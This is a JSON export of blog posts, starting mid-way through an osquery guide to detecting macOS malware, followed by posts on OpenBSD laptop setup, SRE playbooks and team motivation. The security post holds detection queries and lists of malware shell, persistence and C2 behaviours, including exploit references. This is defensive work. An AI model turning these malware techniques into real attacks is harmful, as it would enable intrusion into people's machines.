'/Users/%'\n    AND p.uid \u003e 499\n    AND f.ctime = f.mtime\n    AND f.uid = p.uid\n    AND p.cmdline LIKE './%'\n  )\n GROUP BY\n  p.pid\n```\n\nThe false positives you typically see here are auto-updating software like Google Chrome. Before deploying this query, you'll want to update the list of\nsignature authorities you feel comfortable with. For the full query source, see [execution/unexpected-execdir-macos.sql](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/execution/unexpected-execdir-macos.sql), and for the event-based version, see [unexpected-execdir-events-macos.sql](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/execution/unexpected-execdir-events-macos.sql)\n\n## Execute: Unexpected Shell Parents\n\nMalware will typically allow for command execution within a shell, which is\nnot something most software does. The path to the shell used may differ between Malware, but they typically fall into two camps:\n\n* `/bin/bash`: Mentioned by CloudMensis, DazzleSpy, Gimmick, oRAT, rShell\n* `/bin/sh`: Mentioned by CloudMensis, DazzleSpy, Insekt, KeySteal, oRAT\n* `bash`: Mentioned by pymafka (no path!)\n\nIf you maintain a list of programs you expect to launch a shell you can detect some exciting things. You can also get a bit more specific, by detecting particular flags such as `-s' (pymafka) and `-c\\` (SentinelSneak), but you are likely to miss many other types of execution.\n\nHere's an example base query, using process_events (backwards looking):\n\n```sql\nSELECT\n  pe.path AS child_path,\n  pe.pid,\n  REGEX_MATCH (pe.path, '.*/(.*)', 1) AS child_name,\n  TRIM(pe.cmdline) AS child_cmd,\n  pe.parent AS parent_pid,\n  TRIM(IIF(pp.cmdline != NULL, pp.cmdline, ppe.cmdline)) AS parent_cmd,\n  TRIM(IIF(pp.path != NULL, pp.path, ppe.path)) AS parent_path,\n  REGEX_MATCH (\n    IIF(pp.path != NULL, pp.path, ppe.path),\n    '.*/(.*)',\n    1\n  ) AS parent_name\nFROM\n  process_events pe\n  LEFT JOIN processes p ON pe.pid = p.pid\n  LEFT JOIN processes pp ON pe.parent = pp.pid\n  LEFT JOIN process_events ppe ON pe.parent = ppe.pid\nWHERE\n  pe.path IN ('/bin/bash', '/bin/sh')\n  AND pe.time \u003e (strftime('%s', 'now') -600)\n  AND NOT parent_pid = -1\n  AND NOT (\n    parent_name IN (\n      'zsh',\n      'kubectl',\n      'sudo',\n      'bash',\n      'sh',\n      'git'\n    )\n    OR child_cmd IN (\n      'sh -c python3.7 --version 2\u003e\u00261',\n      'sh -c xcode-select --print-path \u003e/dev/null 2\u003e\u00261 \u0026\u0026 xcrun --sdk macosx --show-sdk-path 2\u003e/dev/null'\n    )\n  )\nGROUP BY\n  pe.pid\n```\n\nWe do some gymnastics in the above query to determine the name of the parent process: and preferring the name of active processes over past processes in the process_events table. We also use TRIM() as osquery often includes trailing spaces in `process_events` table.\n\nFor the full source code, see [initial_access/unexpected-shell-parent-events.sql)](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/initial_access/unexpected-shell-parent-events.sql)\n\n## Persistence: Launchd Program Arguments\n\nWhile there are numerous ways to configure a program to launch after reboots, [launchd](https://www.launchd.info/) is by far the most popular method on macOS. This is even the case for Malware, so you should be auditing any unknown launchd users.\n\nWhile the osquery-defense-toolkit has many launchd related queries, we're going to focus on [unexpected-launchd-program-arguments.sql)](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/persistence/unexpected-launchd-program-arguments.sql) here because it would have caught 2/3rds of the Malware we covered. Here's a simplified version of the query:\n\n```sql\nSELECT\n  l.label,\n  l.name,\n  l.path,\n  TRIM(REGEX_SPLIT (l.program_arguments, ' -', 0)) AS program_path,\n  l.program_arguments,\n  l.keep_alive,\n  signature.authority AS program_authority,\n  hash.sha256\nFROM\n  launchd l\n  LEFT JOIN signature ON program_path = signature.path\n  LEFT JOIN hash ON program_path = hash.path\nWHERE\n  (\n    run_at_load = 1\n    OR keep_alive = 1\n  )\n  AND (\n    program IS NULL\n    OR program = ''\n  )\n  AND l.path NOT LIKE '/System/%'\n  AND program_authority NOT IN (\n    'Developer ID Application: Microsoft Corporation (UBF8T346G9)',\n    'Software Signing'\n  )\n  AND program_arguments NOT IN (\n    '/opt/homebrew/opt/mariadb/bin/mysqld_safe',\n    '/opt/homebrew/opt/skhd/bin/skhd',\n  )\n```\n\nThis is a low-maintenance query, only requiring periodic maintenance of the list of acceptable program authorities. There is a carve out at the end to list acceptable arguments from unsigned launchd entries, such as what you may see with Homebrew.\n\nIt's worth noting that programs may choose to configure themselves using `launchd.program` instead of `launchd.program_arguments`, but that method is less flexible as does not allow for flags to be passed and thus does not seem to b popular with Malware authors. For an example of detecting launchd programs that do not use arguments, see [unexpected-launchd-program.sql](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/persistence/unexpected-launchd-program.sql)\n\n## Communications: Unexpected Talkers\n\nThe root of this query is: to know which programs talk to whom on your network. On macOS, you can use binary signatures to confidently disambiguate between software packages than install locations. You can see the full query source at [c2/unexpected-talkers-macos.sql](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/c2/unexpected-talkers-macos.sql), but this is the base:\n\n```sql\nSELECT\n  protocol,\n  s.local_port,\n  s.remote_port,\n  s.remote_address,\n  p.name,\n  p.path,\n  p.cmdline AS child_cmd,\n  p.cwd,\n  s.pid,\n  p.parent AS parent_pid,\n  pp.path AS parent_path,\n  pp.cmdline AS parent_cmd,\n  CONCAT (\n    MIN(s.remote_port, 32768),\n    ',',\n    protocol,\n    ',',\n    MIN(p.uid, 500),\n    ',',\n    p.name,\n    ',',\n    signature.identifier,\n    ',',\n    signature.authority\n  ) AS exception_key\nFROM\n  process_open_sockets s\n  LEFT JOIN processes p ON s.pid = p.pid\n  LEFT JOIN processes pp ON pp.pid = p.parent\n  LEFT JOIN signature ON p.path = signature.path\nWHERE\n  protocol \u003e 0\n  AND s.remote_port \u003e 0\n  -- Not apple software\n  AND NOT (\n    signature.identifier LIKE 'com.apple.%'\n    AND signature.authority = 'Software Signing'\n    AND remote_port IN (53, 443, 80)\n    AND protocol IN (6, 17)\n  )\n  AND NOT exception_key IN (\n    '22,6,500,Cyberduck,ch.sudo.cyberduck,Developer ID Application: David Kocher (G69SCX94XU)',\n    '443,6,0,Install,com.adobe.Install,Developer ID Application: Adobe Inc. (JQ525L2MZD)',\n    '22,6,500,ssh,com.apple.openssh,Software Signing'\n  )\n```\n\nThe first time you run this query, prepare to feel overwhelmed by all the non-Apple applications you see on the network. The technique I've found useful to build up a list of exceptions is to dump all the results to a programmatic form (CSV, JSON), sort and unique them, and autogenerate the correct syntax to include them into the SQL query.\n\nThe calls to `MIN()` are to disambiguate between root and non-root UIDs and ephemeral port ranges.\n\nOne important caveat about the above query is that it uses `process_open_sockets`, which only shows currently open connections, rather than `socket_events` which allows you to inspect recent events. This means that there is potentially a race condition in which you may not see the talker if it has already closed the connection. For a backward-looking version of this query, try something like:\n\n```sql\nSELECT\n  protocol,\n  s.local_port,\n  s.remote_port,\n  s.remote_address,\n  p.name,\n  p.path,\n  p.cmdline AS child_cmd,\n  p.cwd,\n  s.pid,\n  p.parent AS parent_pid,\n  pp.path AS parent_path,\n  pp.cmdline AS parent_cmd,\n  CONCAT (\n    MIN(s.remote_port, 32768),\n    ',',\n    MIN(p.uid, 500),\n    ',',\n    p.name,\n    ',',\n    signature.identifier,\n    ',',\n    signature.authority\n  ) AS exception_key\nFROM\n  socket_events s\n  LEFT JOIN processes p ON s.pid = p.pid\n  LEFT JOIN processes pp ON pp.pid = p.parent\n  LEFT JOIN signature ON p.path = signature.path\nWHERE s.remote_port \u003e 0\nAND s.time \u003e (strftime('%s', 'now') -600)\n  AND NOT (\n    signature.identifier LIKE 'com.apple.%'\n    AND signature.authority = 'Software Signing'\n    AND remote_port IN (53, 443, 80)\n    AND protocol IN (6, 17)\n  )\n  AND NOT exception_key IN (\n    '22,6,500,Cyberduck,ch.sudo.cyberduck,Developer ID Application: David Kocher (G69SCX94XU)',\n    '443,6,0,Install,com.adobe.Install,Developer ID Application: Adobe Inc. (JQ525L2MZD)',\n    '22,6,500,ssh,com.apple.openssh,Software Signing'\n  )\n```\n\nOn my osquery installation, `socket_events.protocol` is always NULL, so I've omitted it in the second query.\n\nOne optimization we use in the full version of [c2/unexpected-talkers-macos.sql](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/c2/unexpected-talkers-macos.sql) is skipping SIP-protected paths. Checking the signatures of every binary is expensive, so as a performance optimization, we skip the paths that cannot normally be written to.\n\nSome applications are less predictable when it comes to outgoing ports to use, for example: web browsers or SyncThing. For those\nyou may want to craft more targetted logic than relying on `exception_key`.\n\nExpect this query to require a bit of maintenance: updating the list of entries weekly or daily. To make it easier to maintain, consider splitting out a list of HTTP/HTTPS talkers from the rest, as those protocols make up the bulk of communications on macOS. To further lower the maintenance burden, you could also have an exception list of \"These signers can do whatever they want\".\n\n## Follow-ups\n\nWhile reviewing the evidence, several other possibilities for detection arose:\n\n* Calls to 'chmod +x' or other variants: nearly universal across Malware samples\n* Unexpected programs that link against SecurityFramework: GIMMICK, oRAT, CloudMensis, Covid, KeySteal\n* Unexpected programs that link against SystemConfiguration.framework: GIMMICK, CloudMensis, DazzleSpy\n* Unexpected calls to launchctl load: CloudMensis, CoinMiner, DazzleSpy, GIMMICK, KeySteal\n* Unexpected .pkg signers: oRAT, KeySteal\n* Unexpected calls to xattr -c: CloudMensis, KeyStealer\n* Unexpected programs that link against libcurl: SysJoker\n* Processes running with unexpected extensions (.ts): SysJoker\n* Unexpected contents within /var/root: SysJoker, GIMMICK\n* Unexpected executables within /Library: SysJoker\n* Fake Adobe Launchd Services: Coinminer\n* XMRig process arguments: Coinminer\n* Calls to bash -s (stdin): pymafka\n* Programs named \"MacOs\" (bad case): SysJoker, Pymafka\n\nWith any luck, some of these detection ideas will land in the osquery-defense-kit in the coming weeks. Help wanted!\n\n## Other weird things I noticed\n\n* DazzleSpy specifically references `/Volumes/GRMCPRXFRER_CN_DVD` (Windows 7 SP1  DVD ISO)\n* DazzleSpy references `/private/var/log/fsck_hfs.log` - which seems like a weird log to exfiltrato.\n* oRat doesn't have an obvious built-in persistence mechanism, though that may be deployed in a subsequent payload.\n* VPN Trojan (Covid) references `enableReLaunchOnLogin`, but doesn't have a known persistence mechanism.\n* CloudMensis includes ancient Safari escapes: \u003chttps://github.com/maximehip/Safari-iOS10.3.2-macOS-10.12.4-exploit-Bugs/blob/master/Makefile\u003e\n* CloudMensis references files I haven't seen mentioned before: `/Users/%/Library/Logs/imis.log` (possibly just a typo for ims.log), and `/Library/Application Support/Apple/Fonts/iWork/.Standard.ttc`\n* CloudMensis contains some interesting calls to launchctl, such as \"launchctl setenv HOME\". This appears to be related to a TCC bypass for CVE-2020–9934.\n* Insekt has references to the pkexec exploit (Linux). Specifically, `/Users/woody/Downloads/vul/poc-cve-2021-4034-main/exploit.go`\n\nDo let me know if you found this post useful!\n","tags":[],"images":["https://i.snap.as/HrCc01yk.jpg"],"paid":false,"full_post_url":"","views":1048,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"fo2u90aql42ilqp5","slug":"my-yearly-rebirth","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-01-03T14:42:32Z","updated":"2023-01-03T15:00:44Z","title":"My yearly rebirth","body":"For years I’ve had New Year’s resolutions to commit to blogging. This year isn’t any different!\n\n![](https://i.snap.as/sCmY18H9.jpg)\n\nSo, what is different? For one, I feel I have more to share with the world now. I recently moved back to North Carolina, took up motorcycling again, and have professionally refocused on computer security.\n\nIn a surprising turn of events, Twitter recently torched its community goodwill and has suffered a massive brain drain. While this has been felt most acutely in the computer security industry, other groups, such as journalists, have also moved to [Mastodon](https://joinmastodon.org/ \"Mastodon\"). I’ve tried my hand at Mastodon too, and while it’s been a good way to connect with more local personalities, it still feels a bit empty and hollow.\n\nThe post-Twitter shift has made room for a nascent renaissance in distributed social media and even blogging. There's been a clamor for folks to [Start a Fucking Blog](https://startafuckingblog.com/). Feeds are back en vogue, even if they have taken on a new flavor: [ActivityPub](https://www.w3.org/TR/activitypub/). \n\nNow blogs such as this one have ActivityPub feeds, which means they can be followed on Mastodon (this one is `@thomrstrom@unfinished.bike`). Even a decade after it was declared dead, RSS is still around and [Feedly](https://feedly.com/) is as good as ever.\n\nIt remains to be seen what will be done with this next-to-new-found-land.","tags":[],"images":["https://i.snap.as/sCmY18H9.jpg"],"paid":false,"full_post_url":"","views":206,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"921nz6gdlx82td9n","slug":"openbsd-on-the-framework-laptop","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2022-01-21T05:00:00Z","updated":"2023-01-03T03:11:52Z","title":"OpenBSD on the Framework laptop","body":"![Framework laptop outside](https://i.snap.as/SCBz5x15.jpg)\n\nWhile preparing for my first week at [Chainguard](https://chainguard.dev/), the CEO mentioned that I should order my own laptop. As a \\~15 person startup, there isn't an IT department to handle these sorts of things.\n\nIn 2022, the default laptop of choice for a software engineer working on cloud infrastructure is the [Apple M1 Powerbook](https://apple.com/powerbook). They hit nearly all the checkboxes: a great screen, powerful CPUs, and battery life that is the envy of any laptop in their class. The arm64 based Macs are fantastic: in fact, I'm typing this from my personal M1 MacBook Air. Ever the contrarian, I however felt that:\n\n\u003c!--more--\u003e\n\n* Working at a company that embraces a secure-by-default stance should use an operating system that matches philosophically\n* Using a non-standard environment ensures that I will need to learn the underlying system internals\n* As an open-source contributor, supporting alternative platforms promotes inclusiveness, diversity, and clean architecture.\n\nThe clear hardware choice for rebellious open-source developers in 2022? The Framework Laptop. It ships with open-source firmware, is available without a closed-source operating system, and is designed to be user upgradeable.\n\nOpenBSD has always been a contumacious alternative, particularly on a laptop. That said, if you work in computer security, you owe it to yourself to try OpenBSD some time: if only to learn about the impact of a secure-by-default stance has on user behavior. While I expected OpenBSD to be painful on a laptop, I was comforted when I found this another blogger, Joshua Stein, who had [detailed their experience](https://jcs.org/2021/08/06/framework) (with much better photos)\n\n## Assembly\n\n![](https://i.snap.as/9bk4VhFN.jpg)\n\n![Framework Laptop Opened Up](framework-laptop-open.jpg)\n\nThe Framework laptops come in two varieties: a pre-assembled laptop with Windows, and a DIY laptop without an OS. Since I wasn't planning on running Windows, I opted for the DIY version to save money. I won't repeat what is already in the excellent [Framework Laptop DIY Edition Quick Start Guide](https://guides.frame.work/Guide/Framework+Laptop+DIY+Edition+Quick+Start+Guide/57), but I'll share some notes.\n\n![](https://i.snap.as/mOqFWFLn.jpg)![Installing the network card](network-card-install.jpg)\n\nDifficulty levels:\n\n* Memory: easy to add\n* Storage: easy to add\n* Wireless: easy to screw up once\n* I/O ports: Trivial (I opted for 3 USB-C ports and 1 USB-A port)\n* ![](https://i.snap.as/o6czeU7r.jpg)\n\n![Framework I/O port installation](framework-laptop-io-install.jpg)\n\nStandout features:\n\n* The I/O ports have plenty of clearance from one another. The aesthetics aren't great, but it means that the ports on each side are always usable, contrary to my MacBook Air.\n* The case screws are all designed to be half-removed and stay in place. As someone who always loses screws, I really appreciated this.\n* The magnetic case clasps are also a surprisingly nice reassuring touch\n* If you make any changes to the RAM configuration, you will be staring at a black screen for the first 1-2 minutes of the next boot. It isn't reassuring at all.\n* The webcam functions excellently (except in low-light).\n\nDue to the compatibility issues documented at [OpenBSD on the Framework Laptop](https://jcs.org/2021/08/06/framework), I bought the older Intel AX201NGW wireless card for a mere $13 on eBay.\n\n## Flashing an OpenBSD USB stick from macOS\n\nI find I learn more about software by installing it from HEAD, or at least a recent snapshot of it. OpenBSD offers [nightly snapshot images](https://cdn.openbsd.org/pub/OpenBSD/snapshots/amd64/), so I opted to download OpenBSD from there. I don't typically do so, but due to my interest in the software signing space, I decided to follow the instructions to confirm that the install image matches the expected SHA256 signature:\n\n```shell\ncurl -O https://cdn.openbsd.org/pub/OpenBSD/snapshots/amd64/SHA256 \nshasum -c SHA256 --ignore-missing\n```\n\nI had no idea that the `shasum` command could pull hashes out of a text file like that. This is a great way to avoid corrupt downloads, but doesn't help at all for avoiding supply-chain attacks, as the checksums and the image share the same mutable distribution mechanism.\n\nWriting the install image to disk on macOS is the same as with other operating systems. Find the device name for the USB stick:\n\n```shell\nsudo diskutil list                                                                 \n```\n\nIn this case, it's a 128GB Samsung Stick connected via USB-C, hiding at\n`/dev/disk4`:\n\n```\n/dev/disk0 (internal):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                         500.3 GB   disk0\n   1:             Apple_APFS_ISC ⁨⁩                        524.3 MB   disk0s1\n   2:                 Apple_APFS ⁨Container disk3⁩         494.4 GB   disk0s2\n   3:        Apple_APFS_Recovery ⁨⁩                        5.4 GB     disk0s3\n...\n/dev/disk4 (external, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:     FDisk_partition_scheme                        *128.3 GB   disk4\n   1:                 DOS_FAT_32 ⁨UNTITLED⁩                128.3 GB   disk4s1\n```\n\nUnmount the disk, and flash it with OpenBSD:\n\n```shell\nsudo diskutil unmountDisk /dev/disk4 \nsudo dd if=install70.img of=/dev/disk4 bs=1m                                         ```\n```\n\n## First Boot\n\n![](https://i.snap.as/7VJ1sOiP.jpg)\n\nDuring the first boot, I found myself staring at a black screen for a few minutes. It turns out that this weird behavior is expected when booting a standard open-source operating system due to Secure Boot.\n\nOnce I rebooted, hit F2, and disabled secure boot, the laptop booted directly to USB.\n\n```\nWelcome to the OpenBSD/amd64 7.9 installation program.\n(I)nstall, (U)pgrade, (A)autoinstall, or (S)hell?\n```\n\nSince this is a corporate laptop, I certainly wanted to use Full Disk Encryption. I followed the [OpenBSD Full Disk Encryption](https://www.openbsd.org/faq/faq14.html#softraidFDE), which meant selecting the `(S)hell` option.\n\n![](https://i.snap.as/NLzA0zLE.jpg)\n\nWhile setting up the disks, the laptop suddenly lost power. What The Fudge? I was pretty sure it was related to my hardware, as I wasn't fully confident about was the DIMM insertion, so I attempted a RAM dance (something I learned from working in a Google Datacenter over a decade ago), but it happened again.\n\nI then tried reseating all the components, and it happened again. I found a [scary sounding forum thread](https://community.frame.work/t/instant-power-loss/13474/9), but it wasn't a complete match for what I was seeing. The power loss only seemed to happen while I was typing, and only after a couple of minutes.\n\nIn my 3rd install attempt, everything worked mysteriously. It was only later that I realized I was battling the same touchpad power event \\[https://jcs.org/2021/08/06/framework\\](detailed here). After the installation, I never encountered it again.\n\nOne post-installation surprise was that the Intel Wireless card didn't work - due to a missing firmware blob. I used an older EDIMax USB wireless card, and not only did it work great, but it magically allowed the Intel wireless card to work properly as OpenBSD downloads the necessary drivers during boot time via `fw_update`: if it has a working internet connection to begin with.\n\n## Post-Installation\n\n![](https://i.snap.as/nFsNRGrR.jpg)\n\nI floundered about for a bit trying to choose which desktop environment to use, but eventually settled on [XFCE](https://xfce.org/). I never did get Gnome to work, but MATE worked properly once I ran:\n\n```shell\ndoas rcctl enable messagebus avahi_daemon\ndoas rcctl start messagebus avahi_daemon\n```\n\nI was very impressed that nicities such as hot-plugging a new display and my gnubby key worked out of the box. The OpenBSD of 15 years ago wouldn't have. Since this was a laptop, I enabled power management, though I'm not honestly not sure if it helps at all:\n\n```shell\nrcctl enable apmd\nrcctl set apmd flags -A\nrcctl start apmd\n```\n\nOnce the machine was installed, I configured `doas` to allow the users in the `wheel` group (me)  to easily execute commands as `root`:\n\n```shell\necho \"permit persist :wheel\" \u003e /etc/doas.conf\n```\n\nI set the hostname:\n\n```shell\necho wintermute.chainguard.dev | sudo tee /etc/myname\nsudo hostname $(cat /etc/myname)\n```\n\nI copied the network configuration from the EDIMax USB ethernet to the Intel card I was using:\n\n```shell\ndoas cp /etc/hostname.urtwn0 /etc/hostname.iwx0\n```\n\nOpenBSD disables audio/video recording by default, which makes it difficult to use video-conferencing software. I added these values to `/etc/sysctl.conf`:\n\n```shell\nkern.audio.record=1\nkern.video.record=1\n```\n\nTo allow regular users access to the video device, you'll need to set ownership -- even after every upgrade:\n\n```shell\nsudo chown $USER /dev/video*\n```\n\nI configured OpenBSD to default to using my USB microphone for input and output. Oddly enough, there doesn't seem to be an easy way to enumerate audio devices in OpenBSD, so none of the graphical audio switchers work well.\n\n```shell\ndoas rcctl set sndiod flags -f rsnd/0 -F rsnd/1\ndoas rcctl reload sndiod\n```\n\nI couldn't get screen sharing to work in Google Meet in either Chrome or Firefox, but eventually made it function in Firefox by disabling the [pledge](https://man.openbsd.org/pledge.2) sandbox, as per the [mozilla-firefox port docs](https://openports.pl/path/www/mozilla-firefox):\n\n```\necho disable | doas tee /etc/firefox/pledge.gpu\necho disable | doas tee /etc/firefox/pledge.content\necho disable | doas tee /etc/firefox/pledge.main\necho disable | doas tee /etc/firefox/pledge.rdd\n```\n\nTo keep Firefox and other behemoths from suddenly crashing, I joined the `staff` group and increased the per-process memory limits in `/etc/login.conf`:\n\n```\nstaff:\n\t:datasize-cur=16G:\n\t:datasize-max=infinity:\n\t:maxproc-max=512:\n\t:maxproc-cur=256:\n        :openfiles-cur=4096:\n        :openfiles-max=8192:\n\t:stacksize-cur=32M:\n\t:ignorenologin:\n\t:requirehome@:\n\t:tc=default:\n```\n\nTo play music, I installed [ncspot](https://github.com/hrkfdn/ncspot), a terminal Spotify player. The Spotify web client requires DRM (Digital Rights Management) extensions, which are not supported on OpenBSD. ncspot requires extended terminal settings to avoid corrupt output: `env TERM=xterm-256color LANG=en_US.UTF-8`.\n\n## Annoyances\n\nThe current annoyances with my configuration are:\n\n* Fan control: The laptop fan fans seem overactive in OpenBSD, especially given the normal temperature I've seen. This is noticeable when watching a video stream.\n* Chromium / Google Meet: I never did get screen sharing to work, receiving only the following error: \"Can't share your screen: Sorry, an error has occurred when screensharing.\" I was able to get it to function in Firefox by disabling pledge.\n* Zoom: With Firefox, Zoom reports `Zoom is not supported on your operating system`, but can be accessed using a User-Agent switcher extension. With Chromium, Zoom starts, but audio input doesn't work, reporting `Your browser doesn't support using computer's Audio device`. I haven't tried a user-agent switcher in Chromium.\n* Editors: While NeoVim is good, I miss VSCode. Perhaps [code-server](https://github.com/coder/code-server) will work with some elbow grease. It requires a newer NodeJS than is available in OpenBSD packages, and my attempt to build an updated resulted in SIGABRT issues.\n* Cloud Native: Many common cloud-native tools only exist in a Linux-based universe. Don't expect Docker, Kubernetes, Podman, LIMA, kind, minikube, or ilk to function in OpenBSD. You can still build \u0026 push containers using [ko](https://github.com/google/ko) and sign containers using [cosign](github.com/sigstore/cosign/).\n* Resume after Suspend: I don't know if it's a thing with encrypted volumes, but I have yet to successfully resume after suspend: The fan spins, I see a login prompt, but am unable to type at it. I haven't tried very hard to fix this, but it does mean scarier `fsck` sessions at boot time than I'm used to.\n\n## In Closing\n\nI found that most of the heartache in OpenBSD is related to one of two things:\n\n* Using software that isn't popular with other OpenBSD users: NodeJS, for instance.\n* Paranoid security defaults that can be overcome","tags":[],"images":["https://i.snap.as/SCBz5x15.jpg","https://i.snap.as/9bk4VhFN.jpg","https://i.snap.as/mOqFWFLn.jpg","https://i.snap.as/o6czeU7r.jpg","https://i.snap.as/7VJ1sOiP.jpg","https://i.snap.as/NLzA0zLE.jpg","https://i.snap.as/nFsNRGrR.jpg"],"paid":false,"full_post_url":"","views":452,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"24mvngpthwlv3rtw","slug":"the-anatomy-of-a-great-playbook-entry","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2021-05-21T04:00:00Z","updated":"2023-01-03T15:11:43Z","title":"The anatomy of a great playbook entry","body":"![](https://i.snap.as/H0yXNAle.webp)\n\nWhat if you could easily reduce the length of outages by 3X?\n\nAccording to the [SRE book](https://sre.google/sre-book/introduction/), \"recording the best practices ahead of time in a playbook produces roughly a 3x improvement in MTTR\".  This improvement mirrors my experience with well-written playbooks.\n\nSo what makes a playbook entry \"great\"?\n\n\u003c!--more--\u003e\n\n## Philosophy\n\nRemember how you felt in your first on-call rotation, when you were paged at 3am for a system you barely understood? **Write your playbook entries for that person.**\n\nPlaybooks should provide just enough context to confidently work through an incident, without providing extraneous content that will be a burden to keep up-to-date.\n\nBe wary of playbooks that offer exact remediation steps: these are often a sign of sacrificing human blood to a system that should be automated.\n\n## Discovery\n\nAlerts should always include the relevant playbook URL. Otherwise, you will introduce human error by introducing the possibility of the responder following the incorrect playbook.\n\nConsider including the alert name in the playbook URL to make it easier to find. This also the alert template to be templatized in some systems. For example: `https://playbooks/%%ALERT_NAME%%`\n\n## Structure\n\nPlaybooks are the easiest to scan through in an emergency when they have a consistent structure. The exact best structure may differ depending on the organization, but this is what has worked for me:\n\nThe structure that works best is highly dependent on your team's culture, but this is what has worked for me:\n\n* **Severity**: How to assess the criticality of this alert from your team's point of view. Is it a slow-burning issue that generates tickets, a critical paging event, or does the severity depend on the duration?\n* **Impact**: How are your customers impacted by this alert? Often a one-liner, for example: \"None immediately. If ignored, may result in revenue-impacting customer provisioning failures due to resource exhaustion\"\n* **Metrics**: 1-2 graphs showing the impact, duration, and if the effect is worsening. Inline live-updating graphs work best, as they can prevent the incident responder from making unnecessary changes when the problem is dissipating. Hyperlinks are nearly as good.\n* **Background**: What should a new person on the on-call rotation know about this system? Be terse, providing a hyperlink for more information and/or an architectural diagram. To reduce maintenance burden and cognitive load during incident response, share this section between multiple playbook entries via templating.\n* **Mitigation**: What are the recommended steps to mitigate the issue? This is often in checklist-style and may include steps for rolling back or redirecting traffic.\n* **Debugging**: How should one get started digging into why this alert is firing? For example:\n  1. Check for recent fatal error messages:\n\n  2. Check the cluster for free disk space:\n\n  3. Check url to see when the last release went out\n* **References**: Links to the alert configuration, or code that generates the metric used by the alert, can be useful in understanding the underlying behavior. Post-mortems can also be valuable.\n\n## Formatting\n\n* Be concise\n* Bulleted or numbered lists instead of paragraphs.\n\nThe [Kubernetes Documentation Style Guide](https://kubernetes.io/docs/contribute/style/style-guide/)  has great recommendations for technical documentation, but the most important for playbooks is: **make your commands trivial to copy and paste.**\n\n* Do not include the command prompt. S\n  * See: [data loss due to \u003e character in prompt](https://tanelpoder.com/posts/how-to-stay-safe-in-shell/)\n* Separate commands from example output\n* Do not include real but unrelated host, site, or cluster names in your example command.\n  * I once saw an outage spread when a responder copied an example command with the intent to edit the hostnames before pressing enter. They pressed enter first.\n\n## Maintenance\n\nKeep playbooks up to date by:\n\n* Regularly scheduled [\"Wheel of Misfortune\" role-playing game sessions](%5Bhttps://sre.google/sre-book/accelerating-sre-on-call/), where the previous on-call engineer walks the current on-call engineer through a pager response scenario.\n* Post-mortem action items that suggest playbook updates to decrease the resolution time for future pages for the same alert.\n\nBig-bang efforts such as auditing all of the playbooks for relevance are best made once initially, to get the playbooks into the same structure. I have never seen quarterly playbook reviews work.\n\n_Special thanks to [Joseph Bironas](https://josebiro.medium.com/) for editorial feedback and ideas for this article._","tags":[],"images":["https://i.snap.as/H0yXNAle.webp"],"paid":false,"full_post_url":"","views":165,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"g8ufap0erci31e41","slug":"motivating-software-engineering-teams","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2021-03-09T05:00:00Z","updated":"2023-01-03T15:11:03Z","title":"Motivating Software Engineering Teams","body":"\n![](https://i.snap.as/dYE1fHaq.jpg)\n\nIn my experience as a software engineer and a software engineering manager, I’ve found that the best way to motivate software engineers is with **empathy, purpose, and a sense of craftsmanship**. Conversely, the most effective way to demotivate a software engineering team over the long term is with excessive process and deadlines.\n\nLet’s dive a little bit deeper into the levers I’ve found that work in motivating software engineers into doing their best work:\n\n\u003c!--more--\u003e\n\n## Empathy\n\nThe key to motivating a team is to identify what motivates the people that make up the team, with enough empathy to put yourself in their shoes.\n\nEveryone wants to be happy, but everyone has their unique path to happiness. Learning the career and life goals of everyone on the team allows you to prime the right tasks for them at the right time.\n\nAsking people directly, \"What motivates you as a software engineer?\" will often unlock the right set of hints for how to frame messages in a way that works for them. However, to get an honest and complete answer, one needs to build rapport.\n\n**Building rapport**\n\nBuilding rapport with the team is critical to establishing the psychological safety required for folks to feel comfortable sharing their real thoughts. My advice is to model and build a real personal connection that supersedes the synthetic relationship of the manager to the direct report.\n\nMy strategy for building connection is: demonstrating care, showing vulnerability, and deep listening. Proving that you care is something that you cannot fake. If you cannot care deeply for each person on your team, you will fail to motivate your team in the long term.\n\nA technique I have used successfully is to declare to each person my focus: it's them, and their long-term career. As a manager, the people you inspire are the legacy you will leave behind. This advice may seem antithetical to most business guidance, but if you genuinely care for your team, you will be in a better place to inspire them. After all, as humans, we are more important than the companies in which we serve.\n\nIt is important to recognize that the average tenure at a tech company is three years, so your manager/report relationship will last on average only a year and a half, or about 